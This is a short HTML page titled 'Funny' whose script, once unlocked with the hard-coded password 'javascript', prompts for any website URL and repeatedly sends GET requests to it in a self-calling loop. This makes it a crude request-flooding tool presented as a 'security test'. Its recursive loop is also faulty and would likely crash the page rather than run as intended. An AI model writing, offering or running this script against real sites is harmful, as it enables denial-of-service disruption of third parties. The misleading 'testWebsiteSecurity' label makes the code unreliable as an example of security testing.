<!DOCTYPE html>
<html>
<head>
    <title>Funny</title>
</head>
<body>
    <p>Password:</p>
    <input type="text" id="password" name="username">
    <button id="submit" onClick="mango()">Login</button>

<script>
let password = "";
let targetUrl = 'https://yourwebsite.com';
let iteration = 0;

function mango() {
    password = document.getElementById('password').value;
    if (password === "javascript") {
        const websiteUrl = prompt("Enter the website URL (without 'https://www.'):");
        if (websiteUrl) {
            targetUrl = 'https://www.' + websiteUrl;
            testWebsiteSecurity();
        }
    } else {
        alert("Incorrect password");
        window.location.href = "https://www.example.com";
    }
}

function testWebsiteSecurity() {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', targetUrl, true);
    xhr.send();

    // Dynamically create and execute a new infinite loop
    const newLoop = new Function('iteration', `
        while (password === "javascript") {
            testWebsiteSecurity();
            iteration ++;
            document.title = (\`iteration: $\{iteration}\`);
        }
    `);
    newLoop(iteration);
}
</script> <!-- Empty script tag -->
</body>
</html>
